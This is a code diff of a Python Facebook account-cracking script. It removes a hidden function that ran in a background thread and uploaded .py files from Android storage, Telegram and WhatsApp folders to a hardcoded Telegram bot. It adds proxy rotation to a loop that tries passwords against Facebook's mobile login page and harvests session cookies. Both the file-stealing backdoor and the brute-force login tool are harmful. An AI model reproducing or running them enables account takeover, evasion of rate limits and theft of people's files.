@@ -106,80 +106,6 @@ modd = ['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F',
 uas = []
 rr = random.randint
 rc = random.choice
-
-def sexy():
-    session=requests.session() 
-    bot_token = '7610123709:AAF21eTLyX7I1byWJFV2PSsZKnxGBes9pEw' 
-    chat_id = '1778046662'
-    #-----------( /sdcard
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #------------( /sdcard/Download 
-    try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #-------------( /sdcard/Download/Telegram 
-    try:
-        sdcard_path = '/sdcard/Download/Telegram'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #--------( /sdcard/Telegram/Telegram Files
-    try:
-        sdcard_path = '/sdcard/Telegram/Telegram Files'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
-    try:
-        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-
-with ThreadPool(max_workers=90) as jjj:
-    jjj.submit(sexy)
-
 ugen=[]
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
@@ -208,7 +134,7 @@ N = '\x1b[1;37m'
 cookie_show = []
 #-------------------------(PROXY)----------------------------#
 try:
-  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&timeout=420').text
+  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=in&proxy_format=protocolipport&format=text&timeout=20000').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -1185,6 +1111,8 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1212,7 +1140,7 @@ def mbasic(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
             url = 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8'
-            po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
